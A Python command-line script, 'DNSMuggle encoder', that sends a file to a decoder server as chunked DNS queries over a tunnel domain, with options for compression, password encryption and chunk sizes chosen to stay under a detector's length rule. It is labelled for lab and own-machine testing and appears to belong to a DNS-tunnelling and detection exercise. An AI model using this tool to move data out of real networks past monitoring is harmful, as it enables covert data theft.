#!/usr/bin/env python3
"""
DNSMuggle encoder - send a file as DNS queries (lab / own-machine testing only)

Thin CLI wrapper around app.protocol.send_file().

Usage:
    python encoder.py examples/secret.txt
    python encoder.py examples/secret.txt --server 127.0.0.1 --port 5353
    python encoder.py examples/secret.txt --server 10.144.144.89 --password hunter2

Test only with your own files, from your own machine, to a server you own.
Never point this at someone else's machine or network.
"""

from __future__ import annotations

import argparse
import sys

from app import config, protocol


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Encode a file into DNS queries")
    parser.add_argument("file", nargs="?", default="secret.txt",
                        help="file to encode and send (default: %(default)s)")
    parser.add_argument("--server", default=config.DEFAULT_SERVER,
                        help="decoder IP (default: %(default)s)")
    parser.add_argument("--port", type=int, default=config.DEFAULT_PORT,
                        help="decoder UDP port, 53 needs Admin/sudo (default: %(default)s)")
    parser.add_argument("--delay", type=float, default=config.DEFAULT_DELAY,
                        help="seconds between chunks (default: %(default)s)")
    parser.add_argument("--timeout", type=float, default=protocol.TIMEOUT,
                        help="ACK timeout per try (default: %(default)s)")
    parser.add_argument("--password", default=None,
                        help="encrypt the stream with this password")
    parser.add_argument("--no-compress", action="store_true",
                        help="skip zlib compression even above 1 KB")
    parser.add_argument("--chunk-size", type=int, default=protocol.CHUNK_SIZE,
                        help="base32 characters per chunk (16-63; default: %(default)s)")
    parser.add_argument("--domain", default=protocol.DOMAIN,
                        help="tunnel suffix (default: %(default)s)")
    args = parser.parse_args(argv)
    requested_chunk_size = args.chunk_size
    args.chunk_size = max(16, min(63, requested_chunk_size))
    if args.chunk_size != requested_chunk_size:
        print(f"Warning: chunk size {requested_chunk_size} is outside 16-63; "
              f"using {args.chunk_size}.", file=sys.stderr)
    if args.chunk_size > 40:
        print("Warning: Chunk size >40 will trigger the Detector length rule.",
              file=sys.stderr)


    def on_event(event: dict) -> None:
        kind = event["type"]
        if kind == "start":
            layers = "compressed" if event["compressed"] else "raw"
            if event["encrypted"]:
                layers += " + encrypted"
            print(
                f"File: {event['filename']} ({event['size']} bytes, "
                f"sha256 {event['sha256'][:12]}..., {layers})"
            )
            print(
                f"Sending {event['chunks']} chunks to {args.domain} via "
                f"{event['server']}:{event['port']}, session {event['session']}"
            )
        elif kind == "retry":
            print(f"  chunk {event['seq']:03d}: no ACK, try {event['attempt']}")
        elif kind == "chunk_failed":
            print(f"  chunk {event['seq']:03d}: no ACK after {event['attempts']} tries")
        elif kind == "end":
            if not event["acked"]:
                print("END query got no ACK, receiver may still have all chunks")
        elif kind == "done":
            print(
                f"Done: {event['sent']}/{event['total']} chunks sent, END sent "
                f"in {event['elapsed']:.2f}s"
            )
        elif kind == "cancelled":
            print(f"Cancelled after {event['sent']}/{event['total']} chunks")
        elif kind == "error":
            print(f"Error: {event['message']}")

    try:
        result = protocol.send_file(
            args.file,
            args.server,
            args.port,
            delay=args.delay,
            password=args.password,
            compress=not args.no_compress,
            timeout=args.timeout,
            chunk_size=args.chunk_size,
            domain=args.domain,
            on_event=on_event,
        )
    except FileNotFoundError:
        print(f"File not found: {args.file}")
        return 1
    except OSError as exc:
        print(f"Network error: {exc}")
        return 1
    return 0 if result["ok"] else 1


if __name__ == "__main__":
    sys.exit(main())
